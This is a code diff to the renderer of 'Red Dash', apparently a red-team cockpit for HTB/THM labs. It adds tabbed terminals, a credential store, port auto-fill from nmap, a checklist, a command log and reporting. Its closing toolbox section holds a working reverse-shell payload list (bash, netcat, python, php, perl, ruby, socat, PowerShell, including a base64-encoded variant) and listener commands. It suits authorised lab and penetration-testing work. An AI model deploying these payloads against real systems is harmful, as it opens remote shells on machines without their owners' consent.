@@ -10,8 +10,8 @@ const prefs = {
   set(k, v) { try { localStorage.setItem('rd.' + k, JSON.stringify(v)) } catch {} }
 }
 
-// ---------- TERMINAL ----------
-const term = new Terminal({
+// ---------- TERMINALS (tabbed) ----------
+const TERM_OPTS = {
   cursorBlink: true,
   cursorStyle: 'bar',
   scrollback: 10000,
@@ -41,55 +41,142 @@ const term = new Terminal({
     brightCyan: '#8be3f2',
     brightWhite: '#ffffff'
   }
-})
-const fit = new FitAddon.FitAddon()
-term.loadAddon(fit)
-term.open($('terminal'))
-fit.fit()
-
-// banner — shown each time a shell connects (launch, and after Reload)
-function printBanner() {
-  const R = '\x1b[0m'
-  const RED = '\x1b[1;38;2;255;59;92m'
-  const DIM = '\x1b[38;2;85;85;106m'
-  const TXT = '\x1b[38;2;139;139;158m'
-  term.writeln('')
-  term.writeln(`  ${RED}▶ RED DASH${R}  ${DIM}│${R}  ${TXT}visual red team cockpit${R}`)
-  term.writeln(`  ${DIM}${'─'.repeat(38)}${R}`)
-  term.writeln('')
 }
-printBanner()
+// one entry per open terminal tab; `term` always points at the active one so
+// the rest of the app can keep calling term.focus() / term.write() unchanged
+const terms = new Map()   // id -> { term, fit, el, n }
+let activeTermId = null
+let nextTermId = 1
+let term = null
+const MAX_TERMS = 8
 
-term.onData(d => api.send('term-in', d))
-api.on('term-out', d => term.write(d))
-api.send('term-ready', { cols: term.cols, rows: term.rows })
+function printBannerTo(t) {
+  const R = '\x1b[0m', RED = '\x1b[1;38;2;255;59;92m', DIM = '\x1b[38;2;85;85;106m', TXT = '\x1b[38;2;139;139;158m'
+  t.writeln('')
+  t.writeln(`  ${RED}\u25b6 RED DASH${R}  ${DIM}\u2502${R}  ${TXT}visual red team cockpit${R}`)
+  t.writeln(`  ${DIM}${'\u2500'.repeat(38)}${R}`)
+  t.writeln('')
+}
+// Ctrl+C copies when there's a selection (never interrupts by accident);
+// Ctrl+Shift+K stays the playbook filter shortcut, not sent to the shell
+function makeKeyHandler(t) {
+  return (e) => {
+    if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'k') return false
+    if (e.type !== 'keydown' || !e.ctrlKey || e.key.toLowerCase() !== 'c') return true
+    if (!t.hasSelection()) return true
+    api.invoke('copy-text', t.getSelection())
+    return false
+  }
+}
+function sendInsert(text) { if (activeTermId != null) api.send('term-insert', { id: activeTermId, text }) }
 
-// Ctrl+C copies instead of sending SIGINT only when there's a selection
-// (gnome-terminal / VS Code convention) so it never interrupts by accident
-term.attachCustomKeyEventHandler((e) => {
-  // Ctrl+Shift+K is the app's "filter playbook" shortcut — don't send it to the shell
-  if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'k') return false
-  if (e.type !== 'keydown' || !e.ctrlKey || e.key.toLowerCase() !== 'c') return true
-  if (!term.hasSelection()) return true
-  api.invoke('copy-text', term.getSelection())
-  return false
-})
+function createTerminal(activate = true) {
+  if (terms.size >= MAX_TERMS) { toast(`Up to ${MAX_TERMS} terminals`); return activeTermId }
+  const id = nextTermId++
+  const el = document.createElement('div')
+  el.className = 'term-instance'
+  $('terminal').appendChild(el)
+  const t = new Terminal(TERM_OPTS)
+  const f = new FitAddon.FitAddon()
+  t.loadAddon(f)
+  t.open(el)
+  t.onData(d => api.send('term-in', { id, data: d }))
+  t.attachCustomKeyEventHandler(makeKeyHandler(t))
+  terms.set(id, { term: t, fit: f, el, n: nextTermId - 1 })
+  printBannerTo(t)
+  if (activate) activateTerm(id)
+  // spawn the PTY once the element has a real on-screen size
+  requestAnimationFrame(() => {
+    try { f.fit() } catch {}
+    api.send('term-open', { id, size: { cols: t.cols || 100, rows: t.rows || 30 } })
+    if (id === activeTermId) api.send('term-resize', { id, size: { cols: t.cols || 100, rows: t.rows || 30 } })
+    renderTermTabs()
+  })
+  renderTermTabs()
+  return id
+}
 
-function doFit() {
+function activateTerm(id) {
+  if (!terms.has(id)) return
+  activeTermId = id
+  term = terms.get(id).term
+  for (const [tid, o] of terms) o.el.classList.toggle('active', tid === id)
+  api.send('term-active', { id })
+  renderTermTabs()
+  fitActive()
+  term.focus()
+}
+
+// the pty for this tab has gone (closed, or the user typed `exit`) — tear the
+// tab down; never leave zero terminals
+function disposeTerm(id) {
+  const o = terms.get(id)
+  if (!o) return
+  try { o.term.dispose() } catch {}
+  try { o.el.remove() } catch {}
+  terms.delete(id)
+  if (!terms.size) { createTerminal(true); return }
+  if (activeTermId === id) activateTerm([...terms.keys()][terms.size - 1])
+  else renderTermTabs()
+}
+function closeTerm(id) {
+  if (!terms.has(id)) return
+  api.send('term-close', { id })
+  disposeTerm(id)
+}
+
+function renderTermTabs() {
+  const bar = $('term-tabs')
+  if (!bar) return
+  bar.innerHTML = ''
+  let i = 0
+  for (const [id] of terms) {
+    i++
+    const tab = document.createElement('span')
+    tab.className = 'term-tab' + (id === activeTermId ? ' active' : '')
+    tab.title = 'Terminal ' + i
+    const label = document.createElement('span')
+    label.textContent = `${shellName} ${i}`
+    tab.appendChild(label)
+    if (terms.size > 1) {
+      const x = document.createElement('span')
+      x.className = 'term-tab-x'
+      x.textContent = '\u00d7'
+      x.title = 'Close this terminal'
+      x.onclick = (e) => { e.stopPropagation(); closeTerm(id) }
+      tab.appendChild(x)
+    }
+    tab.onclick = () => activateTerm(id)
+    bar.appendChild(tab)
+  }
+}
+
+function fitActive() {
+  const o = terms.get(activeTermId)
+  if (!o) return
   try {
-    // only resize when the proposed size actually changed — calling fit()
-    // unconditionally inside the ResizeObserver can retrigger it in a loop
-    const proposed = fit.proposeDimensions()
+    const proposed = o.fit.proposeDimensions()
     if (!proposed) return
-    if (proposed.cols === term.cols && proposed.rows === term.rows) return
-    fit.fit()
-    api.send('term-resize', { cols: term.cols, rows: term.rows })
+    if (proposed.cols === o.term.cols && proposed.rows === o.term.rows) return
+    o.fit.fit()
+    api.send('term-resize', { id: activeTermId, size: { cols: o.term.cols, rows: o.term.rows } })
   } catch {}
 }
-window.addEventListener('resize', doFit)
-setTimeout(doFit, 300)
+
+api.on('term-out', ({ id, data }) => { const o = terms.get(id); if (o) o.term.write(data) })
+api.on('term-exit', ({ id }) => disposeTerm(id))
+
+const termAddBtn = $('term-add')
+if (termAddBtn) termAddBtn.onclick = () => { createTerminal(true) }
+
+// NB: the first terminal is created in INIT (below), once shellName/toast and
+// the rest of the app's state exist — creating it here would hit them in their
+// temporal dead zone and throw before the app finishes loading.
+
+window.addEventListener('resize', fitActive)
+setTimeout(fitActive, 300)
 // panel size changes (resizers, popups) don't fire window.resize
-new ResizeObserver(doFit).observe($('terminal'))
+new ResizeObserver(fitActive).observe($('terminal'))
 
 // ---------- STATE ----------
 let target = { target: '', domain: '', workspace: '' }
@@ -98,9 +185,20 @@ let shellName = 'shell'
 let missingTools = new Set()
 const DEFAULTS = {
   WORDLIST: '/usr/share/seclists/Discovery/Web-Content/common.txt',
-  SUBLIST: '/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt',
-  PORTS: ''
+  SUBLIST: '/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt'
 }
+// per-box data (ports + creds + checklist), saved to workspaces/<box>/box.json
+const EMPTY_BOX = () => ({ ports: '', portsManual: false, creds: [], activeCred: -1, checklist: [] })
+let box = EMPTY_BOX()
+function activeCred() { return box.creds[box.activeCred] || null }
+
+// single-quote a value for the shell only when it needs it, so plain
+// usernames stay readable in the terminal
+function shq(s) {
+  return /^[A-Za-z0-9_@%+=:,.\/-]+$/.test(s) ? s : `'${s.replace(/'/g, `'\\''`)}'`
+}
+// `<hash>` is the NT hash; accept a pasted LM:NT pair and keep the NT half
+function ntHash(h) { return h.includes(':') ? h.split(':').pop() : h }
 
 function esc(s) {
   return String(s).replace(/[&<>"]/g, c => (
@@ -163,12 +261,14 @@ async function loadTarget() {
 }
 function updateTargetDisplay() {
   const t = target.target || target.domain
-  $('term-target').textContent = t ? '▸ ' + [target.target, target.domain].filter(Boolean).join(' · ') : ''
+  const c = activeCred()
+  const who = c && c.user ? ` · as ${c.user}` : ''
+  $('term-target').textContent = t ? '▸ ' + [target.target, target.domain].filter(Boolean).join(' · ') + who : who.slice(3)
   document.title = t ? `Red Dash ▸ ${t}` : 'Red Dash'
 }
-function updateTermTitle() {
-  $('term-title').textContent = target.workspace ? `${shellName} — ${target.workspace}` : shellName
-}
+// the box name shows in the top bar + target line; the terminal header now
+// carries the tabs, so this just refreshes their labels (shell name)
+function updateTermTitle() { renderTermTabs() }
 async function setTarget() {
   target = await api.invoke('set-target', {
     target: inTarget.value.trim(), domain: inDomain.value.trim()
@@ -206,8 +306,9 @@ async function switchWorkspace(name) {
   target.workspace = res.workspace
   updateDeleteBtn(); updateTermTitle()
   clearOutputView()
+  await loadBox()
   refreshOutput(); renderExamples()
-  if (activeTab !== 'output') loadNote(activeTab)
+  if (activeTab === 'notes' || activeTab === 'loot') loadNote(activeTab)
 }
 selWs.onchange = () => { if (selWs.value) switchWorkspace(selWs.value) }
 
@@ -254,8 +355,9 @@ $('delete-confirm').onclick = async () => {
   updateDeleteBtn(); updateTermTitle()
   await loadWorkspaces()
   clearOutputView()
+  await loadBox()
   refreshOutput(); renderExamples()
-  if (activeTab !== 'output') loadNote(activeTab)
+  if (activeTab === 'notes' || activeTab === 'loot') loadNote(activeTab)
   toast(`Deleted ${name}`)
 }
 
@@ -263,9 +365,11 @@ $('delete-confirm').onclick = async () => {
 $('btn-reload').onclick = async () => { await flushNote(); location.reload() }
 
 // ---------- VPN STATUS (HTB/THM openvpn or wireguard) ----------
+let vpnIp = null   // last seen VPN IP, used as the default LHOST in the toolbox
 async function checkVpn() {
   const v = await api.invoke('check-vpn')
   const el = $('vpn-status')
+  vpnIp = v.connected ? v.ip : null
   if (v.connected) {
     el.className = 'pill ok'
     $('vpn-text').textContent = v.ip
@@ -396,18 +500,36 @@ async function loadExamples() {
   allExamples = await api.invoke('get-examples')
   renderExamples()
 }
-function fillVars(cmd) {
-  return cmd
+// `forDisplay` swaps cred values for markers that prettyCmd turns into
+// highlighted (and, for secrets, masked) chips — so a password never shows
+// on screen in the playbook, only in the command that's sent to the shell
+const MARK = { user: '\u0001U\u0001', pass: '\u0001P\u0001', hash: '\u0001H\u0001', ports: '\u0001O\u0001' }
+function fillVars(cmd, forDisplay = false) {
+  let s = cmd
     .replaceAll('{TARGET}', target.target || '{TARGET}')
     .replaceAll('{DOMAIN}', target.domain || '{DOMAIN}')
     .replaceAll('{OUT}', currentOutDir || 'output')
     .replaceAll('{WORDLIST}', DEFAULTS.WORDLIST)
     .replaceAll('{SUBLIST}', DEFAULTS.SUBLIST)
-    .replaceAll('{PORTS}', DEFAULTS.PORTS || '{PORTS}')
+    .replaceAll('{PORTS}', box.ports ? (forDisplay ? MARK.ports : box.ports) : '{PORTS}')
+  const c = activeCred()
+  if (c) {
+    const vals = { user: c.user, pass: c.pass, hash: c.hash && ntHash(c.hash) }
+    for (const k of ['user', 'pass', 'hash']) {
+      if (vals[k]) s = s.replaceAll(`<${k}>`, forDisplay ? MARK[k] : shq(vals[k]))
+    }
+  }
+  return s
 }
 // escape, then shorten long absolute paths and highlight what still needs typing
 function prettyCmd(cmd) {
-  let s = esc(cmd)
+  let s = esc(cmd).replaceAll(MARK.ports, `<span class="filled" title="${box.portsManual ? 'typed by you' : 'from nmap'}">${esc(box.ports)}</span>`)
+  const c = activeCred()
+  if (c) {
+    s = s.replaceAll(MARK.user, `<span class="filled cred-fill">${esc(c.user)}</span>`)
+      .replaceAll(MARK.pass, '<span class="filled cred-fill" title="password hidden">••••••</span>')
+      .replaceAll(MARK.hash, `<span class="filled cred-fill" title="NT hash">${esc(ntHash(c.hash).slice(0, 6))}…</span>`)
+  }
   if (currentOutDir) s = s.replaceAll(esc(currentOutDir), '<span class="filled">$OUT</span>')
   for (const k of ['WORDLIST', 'SUBLIST']) {
     const v = esc(DEFAULTS[k])
@@ -449,16 +571,16 @@ function renderExamples() {
     const items = document.createElement('div')
     items.className = 'tool-items'
     for (const ex of groups[tool]) {
-      const cmd = fillVars(ex.command)
       const el = document.createElement('div')
       el.className = 'ex'
       el.title = 'Click to drop into the terminal'
       el.innerHTML = `
         <div class="ex-name">${ex.mine ? '<span class="star">★</span> ' : ''}${esc(ex.name)}</div>
-        <div class="ex-cmd">${prettyCmd(cmd)}</div>
+        <div class="ex-cmd">${prettyCmd(fillVars(ex.command, true))}</div>
         ${ex.note ? `<div class="ex-note">${esc(ex.note)}</div>` : ''}`
       el.onclick = () => {
-        api.send('term-insert', cmd)
+        // fill at click time so it always uses the current ports / cred
+        insertToTerm(fillVars(ex.command))
         term.focus()
         el.classList.add('sent')
         setTimeout(() => el.classList.remove('sent'), 900)
@@ -601,7 +723,7 @@ function clearOutputView() {
 let outputRefreshTimer
 api.on('output-changed', () => {
   clearTimeout(outputRefreshTimer)
-  outputRefreshTimer = setTimeout(refreshOutput, 250)
+  outputRefreshTimer = setTimeout(() => { refreshOutput(); autoPorts() }, 250)
 })
 $('btn-refresh-output').onclick = refreshOutput
 // keep the "2m ago" labels honest
@@ -705,7 +827,7 @@ function renderWhatweb(txt) {
 
 // ---------- NOTES / LOOT TABS ----------
 let activeTab = 'output'
-const tabButtons = { output: $('tab-output'), notes: $('tab-notes'), loot: $('tab-loot') }
+const tabButtons = { output: $('tab-output'), notes: $('tab-notes'), loot: $('tab-loot'), creds: $('tab-creds'), checklist: $('tab-checklist'), log: $('tab-log') }
 const notesView = $('notes-view')
 const lootView = $('loot-view')
 const savedMsg = $('note-saved-msg')
@@ -725,7 +847,7 @@ async function loadNote(type) {
 // box the main process writes to, so text never lands in the wrong box
 async function flushNote() {
   clearTimeout(noteTimer)
-  if (!noteDirty || activeTab === 'output') { noteDirty = false; return }
+  if (!noteDirty || (activeTab !== 'notes' && activeTab !== 'loot')) { noteDirty = false; return }
   noteDirty = false
   const text = (activeTab === 'notes' ? notesView : lootView).value
   await api.invoke('write-note', activeTab, text)
@@ -749,19 +871,443 @@ async function switchTab(tab) {
   $('output-pane').classList.toggle('hidden', tab !== 'output')
   notesView.classList.toggle('hidden', tab !== 'notes')
   lootView.classList.toggle('hidden', tab !== 'loot')
+  $('creds-pane').classList.toggle('hidden', tab !== 'creds')
+  $('checklist-pane').classList.toggle('hidden', tab !== 'checklist')
+  $('log-pane').classList.toggle('hidden', tab !== 'log')
   $('btn-refresh-output').classList.toggle('hidden', tab !== 'output')
-  if (tab !== 'output') { await loadNote(tab); (tab === 'notes' ? notesView : lootView).focus() }
+  if (tab === 'notes' || tab === 'loot') { await loadNote(tab); (tab === 'notes' ? notesView : lootView).focus() }
+  if (tab === 'creds') { renderCreds(); if (target.workspace) $('cred-user').focus() }
+  if (tab === 'checklist') { renderChecklist(); if (target.workspace) $('check-input').focus() }
+  if (tab === 'log') renderLog()
 }
-tabButtons.output.onclick = () => switchTab('output')
-tabButtons.notes.onclick = () => switchTab('notes')
-tabButtons.loot.onclick = () => switchTab('loot')
+for (const tab of Object.keys(tabButtons)) tabButtons[tab].onclick = () => switchTab(tab)
 window.addEventListener('beforeunload', () => { if (noteDirty) flushNote() })
+
+// ---------- BOX DATA (ports + creds) ----------
+async function loadBox() {
+  box = target.workspace ? await api.invoke('read-box') : EMPTY_BOX()
+  renderPorts(); renderCreds(); renderChecklist(); updateTargetDisplay(); updateLogBadge()
+  if (activeTab === 'log') renderLog()
+  await autoPorts(true)
+}
+function saveBox() {
+  if (target.workspace) api.invoke('write-box', box)
+}
+
+// ---------- PORTS (auto from nmap, or typed by hand) ----------
+const inPorts = $('in-ports')
+function renderPorts() {
+  const on = !!target.workspace
+  inPorts.disabled = !on
+  $('btn-ports-auto').disabled = !on
+  inPorts.value = box.ports
+  inPorts.placeholder = on ? 'auto from nmap' : 'pick a box'
+  inPorts.classList.toggle('manual', box.portsManual)
+  $('btn-ports-auto').classList.toggle('on', on && !box.portsManual)
+  inPorts.title = box.portsManual
+    ? 'Typed by you — click AUTO to fill from nmap again'
+    : 'Filled automatically from this box\'s nmap scans (type to override)'
+}
+// quiet = don't toast (used when just switching boxes)
+async function autoPorts(quiet = false) {
+  if (!target.workspace || box.portsManual) return
+  const found = await api.invoke('get-ports')
+  if (found === box.ports) return
+  box.ports = found
+  saveBox(); renderPorts(); renderExamples()
+  if (!quiet && found) toast(`Ports from nmap: ${found}`)
+}
+function commitPorts() {
+  if (!target.workspace) return
+  // keep only real ports / ranges ("22", "1-1000") — this ends up in the shell
+  const typed = (inPorts.value.match(/\d+(?:-\d+)?/g) || []).join(',')
+  if (typed === box.ports && box.portsManual) return renderPorts()
+  if (!typed) {
+    // cleared the box → go back to automatic
+    box.portsManual = false
+    box.ports = ''
+    saveBox(); renderPorts(); renderExamples(); autoPorts()
+    return
+  }
+  if (typed === box.ports) return renderPorts()   // unchanged, stay automatic
+  box.ports = typed
+  box.portsManual = true
+  saveBox(); renderPorts(); renderExamples()
+  toast('Ports set by hand')
+}
+inPorts.addEventListener('keydown', (e) => {
+  if (e.key === 'Enter') { commitPorts(); term.focus() }
+  else if (e.key === 'Escape') { renderPorts(); term.focus() }
+})
+inPorts.addEventListener('blur', commitPorts)
+$('btn-ports-auto').onclick = async () => {
+  box.portsManual = false
+  box.ports = ''
+  renderPorts()
+  await autoPorts(true)
+  saveBox(); renderPorts(); renderExamples()
+  toast(box.ports ? `Ports from nmap: ${box.ports}` : 'No open ports in nmap output yet')
+}
+
+// ---------- CREDS ----------
+const credInputs = ['cred-user', 'cred-pass', 'cred-hash', 'cred-note'].map($)
+function renderCreds() {
+  const list = $('cred-list')
+  const on = !!target.workspace
+  credInputs.forEach(i => { i.disabled = !on })
+  $('cred-add').disabled = !on
+  const count = $('cred-count')
+  count.textContent = box.creds.length
+  count.classList.toggle('hidden', !box.creds.length)
+  list.innerHTML = ''
+  if (!on) { list.innerHTML = '<div class="empty">Pick or create a box first.</div>'; return }
+  if (!box.creds.length) {
+    list.innerHTML = '<div class="empty">No creds yet.<br>Add a user + password or hash above.</div>'
+    return
+  }
+  box.creds.forEach((c, i) => {
+    const el = document.createElement('div')
+    el.className = 'cred' + (i === box.activeCred ? ' active' : '')
+    el.title = i === box.activeCred ? 'In use — click to stop using it' : 'Click to use in the playbook'
+    el.innerHTML = `
+      <div class="cred-top">
+        <span class="cred-dot"></span>
+        <span class="cred-user">${esc(c.user || '(no user)')}</span>
+        ${i === box.activeCred ? '<span class="cred-tag">IN USE</span>' : ''}
+      </div>
+      ${c.pass ? '<div class="cred-line"><span class="k">pass</span><span class="v">••••••</span></div>' : ''}
+      ${c.hash ? `<div class="cred-line"><span class="k">hash</span><span class="v">${esc(c.hash.length > 18 ? c.hash.slice(0, 18) + '…' : c.hash)}</span></div>` : ''}
+      ${c.note ? `<div class="cred-note">${esc(c.note)}</div>` : ''}`
+    const actions = document.createElement('div')
+    actions.className = 'cred-actions'
+    const addBtn = (label, title, fn) => {
+      const b = document.createElement('button')
+      b.className = 'mini ghost'
+      b.textContent = label
+      b.title = title
+      b.onclick = (e) => { e.stopPropagation(); fn() }
+      actions.appendChild(b)
+    }
+    const copy = async (what, val) => {
+      const ok = await api.invoke('copy-text', val)
+      toast(ok ? `Copied ${what}` : 'Copy failed')
+    }
+    if (c.pass) addBtn('copy pass', 'Copy password', () => copy('password', c.pass))
+    if (c.hash) addBtn('copy hash', 'Copy hash', () => copy('hash', c.hash))
+    addBtn('×', 'Delete this cred', () => {
+      if (!confirm(`Delete cred "${c.user || '(no user)'}"?`)) return
+      box.creds.splice(i, 1)
+      if (box.activeCred === i) box.activeCred = -1
+      else if (box.activeCred > i) box.activeCred--
+      credsChanged()
+    })
+    el.appendChild(actions)
+    el.onclick = () => {
+      box.activeCred = box.activeCred === i ? -1 : i
+      credsChanged()
+      toast(box.activeCred === i ? `Using ${c.user || 'cred'} in the playbook` : 'Cred not in use')
+    }
+    list.appendChild(el)
+  })
+}
+function credsChanged() {
+  saveBox(); renderCreds(); renderExamples(); updateTargetDisplay()
+}
+function addCred() {
+  const [user, pass, hash, note] = credInputs.map(i => i.value.trim())
+  if (!user && !pass && !hash) { $('cred-user').focus(); return }
+  box.creds.push({ user, pass, hash, note })
+  // the first cred of a box goes straight into use — that's nearly always wanted
+  if (box.activeCred < 0) box.activeCred = box.creds.length - 1
+  credInputs.forEach(i => { i.value = '' })
+  credsChanged()
+  $('cred-user').focus()
+  toast('Cred saved')
+}
+$('cred-add').onclick = addCred
+credInputs.forEach(i => i.addEventListener('keydown', (e) => { if (e.key === 'Enter') addCred() }))
+
+// ---------- CHECKLIST ----------
+const checkInput = $('check-input')
+function renderChecklist() {
+  const list = $('check-list')
+  const on = !!target.workspace
+  checkInput.disabled = !on
+  $('check-add').disabled = !on
+  $('check-reset').disabled = !on
+  const items = box.checklist || []
+  const done = items.filter(c => c.done).length
+  const pct = items.length ? Math.round(done / items.length * 100) : 0
+  $('check-bar').style.width = pct + '%'
+  $('check-bar').classList.toggle('full', pct === 100 && items.length > 0)
+  $('check-label').textContent = items.length ? `${done}/${items.length}` : ''
+  const badge = $('check-count')
+  badge.textContent = items.length ? `${done}/${items.length}` : ''
+  badge.classList.toggle('hidden', !items.length)
+  badge.classList.toggle('all-done', items.length > 0 && done === items.length)
+  list.innerHTML = ''
+  if (!on) { list.innerHTML = '<div class="empty">Pick or create a box first.</div>'; return }
+  if (!items.length) { list.innerHTML = '<div class="empty">No steps. Add one above, or reset to the default list.</div>'; return }
+  items.forEach((c, i) => {
+    const el = document.createElement('div')
+    el.className = 'check' + (c.done ? ' done' : '')
+    const boxEl = document.createElement('span')
+    boxEl.className = 'check-box'
+    boxEl.textContent = c.done ? '✓' : ''
+    const txt = document.createElement('span')
+    txt.className = 'check-text'
+    txt.textContent = c.text
+    const del = document.createElement('span')
+    del.className = 'check-del'; del.textContent = '×'; del.title = 'Remove this step'
+    del.onclick = (e) => { e.stopPropagation(); box.checklist.splice(i, 1); checklistChanged() }
+    el.append(boxEl, txt, del)
+    el.onclick = () => { c.done = !c.done; checklistChanged() }
+    list.appendChild(el)
+  })
+}
+function checklistChanged() { saveBox(); renderChecklist() }
+function addCheck() {
+  const text = checkInput.value.trim()
+  if (!text || !target.workspace) return
+  box.checklist.push({ text, done: false })
+  checkInput.value = ''
+  checklistChanged()
+}
+$('check-add').onclick = addCheck
+checkInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') addCheck() })
+$('check-reset').onclick = async () => {
+  if (!target.workspace) return
+  if (!confirm('Reset this box to the default checklist? Your current steps are replaced.')) return
+  box.checklist = undefined          // undefined -> main process re-seeds the template
+  await api.invoke('write-box', box)
+  box = await api.invoke('read-box')
+  renderChecklist()
+  toast('Checklist reset')
+}
+
+// ---------- COMMAND LOG ----------
+// Sends a command to the terminal AND records it in this box's log.
+async function insertToTerm(cmd) {
+  sendInsert(cmd)
+  if (target.workspace) {
+    await api.invoke('append-log', cmd)
+    updateLogBadge()
+    if (activeTab === 'log') renderLog()
+  }
+}
+async function updateLogBadge() {
+  const badge = $('log-count')
+  const log = target.workspace ? await api.invoke('read-log') : []
+  badge.textContent = log.length || ''
+  badge.classList.toggle('hidden', !log.length)
+}
+async function renderLog() {
+  const list = $('log-list')
+  if (!target.workspace) { list.innerHTML = '<div class="empty">Pick or create a box first.</div>'; return }
+  const log = await api.invoke('read-log')
+  if (!log.length) { list.innerHTML = '<div class="empty">Nothing yet. Commands you click in the playbook or send from the toolbox show up here.</div>'; return }
+  list.innerHTML = ''
+  // newest first
+  log.slice().reverse().forEach((e, ri) => {
+    const i = log.length - 1 - ri
+    const el = document.createElement('div')
+    el.className = 'log-row'
+    el.title = 'Click to send this command again'
+    el.innerHTML = `<span class="log-time">${esc(logTime(e.t))}</span><span class="log-cmd">${esc(e.cmd)}</span>`
+    const del = document.createElement('span')
+    del.className = 'log-del'; del.textContent = '×'; del.title = 'Remove from log'
+    del.onclick = async (ev) => { ev.stopPropagation(); await api.invoke('delete-log-entry', i); updateLogBadge(); renderLog() }
+    el.appendChild(del)
+    el.onclick = () => { sendInsert(e.cmd); term.focus(); toast('Sent again') }
+    list.appendChild(el)
+  })
+}
+function logTime(ms) {
+  const d = new Date(ms)
+  return d.toLocaleString([], { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' })
+}
+$('log-clear').onclick = async () => {
+  if (!target.workspace) return
+  if (!confirm('Clear the command log for this box?')) return
+  await api.invoke('clear-log')
+  updateLogBadge(); renderLog(); toast('Log cleared')
+}
+
+// ---------- REPORT ----------
+const reportModal = $('modal-report')
+let reportMd = ''
+async function openReport() {
+  if (!target.workspace) { toast('Pick a box first'); return }
+  reportMd = await api.invoke('build-report')
+  $('report-text').textContent = reportMd || '(nothing to report yet)'
+  $('report-sub').textContent = target.workspace
+  $('report-result').classList.add('hidden')
+  reportModal.classList.remove('hidden')
+}
+async function saveReport(format) {
+  const r = await api.invoke('export-report', format)
+  const box = $('report-result')
+  box.classList.remove('hidden')
+  if (r.ok) { box.className = 'report-result ok'; box.textContent = 'Saved → ' + r.path }
+  else { box.className = 'report-result bad'; box.textContent = 'Could not save: ' + (r.error || 'unknown') }
+}
+$('btn-report').onclick = openReport
+$('report-close').onclick = () => reportModal.classList.add('hidden')
+$('report-md').onclick = () => saveReport('md')
+$('report-pdf').onclick = () => saveReport('pdf')
+$('report-html').onclick = () => saveReport('html')
+$('report-copy').onclick = async () => { const ok = await api.invoke('copy-text', reportMd); toast(ok ? 'Markdown copied' : 'Copy failed') }
+
+// ---------- FX (glow / scanlines / motion) ----------
+function applyFx(on) {
+  document.body.classList.toggle('fx-off', !on)
+  $('btn-fx').classList.toggle('on', on)
+  $('btn-fx').textContent = on ? 'FX' : 'FX off'
+}
+applyFx(prefs.get('fx', true))
+$('btn-fx').onclick = () => {
+  const on = document.body.classList.contains('fx-off')
+  prefs.set('fx', on)
+  applyFx(on)
+  toast(on ? 'Effects on' : 'Effects off')
+}
+
+// ---------- TOOLBOX: reverse shells + hash ID ----------
+const tbModal = $('modal-toolbox')
+// %H / %P get replaced with host / port. Payloads are the common revshells set.
+const SHELLS = {
+  'bash-i':        `bash -c 'bash -i >& /dev/tcp/%H/%P 0>&1'`,
+  'bash-196':      `0<&196;exec 196<>/dev/tcp/%H/%P; sh <&196 >&196 2>&196`,
+  'sh':            `sh -i >& /dev/tcp/%H/%P 0>&1`,
+  'nc-mkfifo':     `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %H %P >/tmp/f`,
+  'nc-e':          `nc -e /bin/sh %H %P`,
+  'python3':       `python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("%H",%P));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`,
+  'php':           `php -r '$sock=fsockopen("%H",%P);exec("/bin/sh -i <&3 >&3 2>&3");'`,
+  'perl':          `perl -e 'use Socket;$i="%H";$p=%P;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
+  'ruby':          `ruby -rsocket -e'f=TCPSocket.open("%H",%P).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
+  'socat':         `socat TCP:%H:%P EXEC:'bash -li',pty,stderr,setsid,sigint,sane`,
+  'powershell':    `powershell -nop -W hidden -noni -c "$c=New-Object System.Net.Sockets.TCPClient('%H',%P);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()"`
+}
+// PowerShell's -EncodedCommand wants the inner script as base64 of UTF-16LE
+function psEncode(host, port) {
+  const inner = SHELLS.powershell.replace(/^powershell -nop -W hidden -noni -c "/, '').replace(/"$/, '')
+    .replace(/%H/g, host).replace(/%P/g, port)
+  let bin = ''
+  for (const ch of inner) { const c = ch.charCodeAt(0); bin += String.fromCharCode(c & 0xff, (c >> 8) & 0xff) }
+  return 'powershell -nop -W hidden -e ' + btoa(bin)
+}
+function genShell() {
+  const host = $('tb-lhost').value.trim() || '<lhost>'
+  const port = ($('tb-lport').value.trim().match(/\d+/) || ['4444'])[0]
+  const type = $('tb-shell-type').value
+  const cmd = type === 'powershell-b64'
+    ? psEncode(host, port)
+    : SHELLS[type].replace(/%H/g, host).replace(/%P/g, port)
+  $('tb-shell-out').textContent = cmd
+  const listener = type === 'socat'
+    ? `socat -d -d TCP-LISTEN:${port},reuseaddr FILE:\`tty\`,raw,echo=0`
+    : `nc -lvnp ${port}`
+  $('tb-listen-out').textContent = listener
+  return { cmd, listener }
+}
+function openToolbox() {
+  if (vpnIp && !$('tb-lhost').value.trim()) $('tb-lhost').value = vpnIp
+  genShell()
+  tbModal.classList.remove('hidden')
+}
+$('btn-toolbox').onclick = openToolbox
+$('tb-close').onclick = () => tbModal.classList.add('hidden')
+;['tb-lhost', 'tb-lport'].forEach(id => $(id).addEventListener('input', genShell))
+$('tb-shell-type').addEventListener('change', genShell)
+function tbSubTab(which) {
+  $('tb-tab-shell').classList.toggle('active', which === 'shell')
+  $('tb-tab-hash').classList.toggle('active', which === 'hash')
+  $('tb-shell').classList.toggle('hidden', which !== 'shell')
+  $('tb-hash').classList.toggle('hidden', which !== 'hash')
+  if (which === 'hash') $('tb-hash-in').focus()
+}
+$('tb-tab-shell').onclick = () => tbSubTab('shell')
+$('tb-tab-hash').onclick = () => tbSubTab('hash')
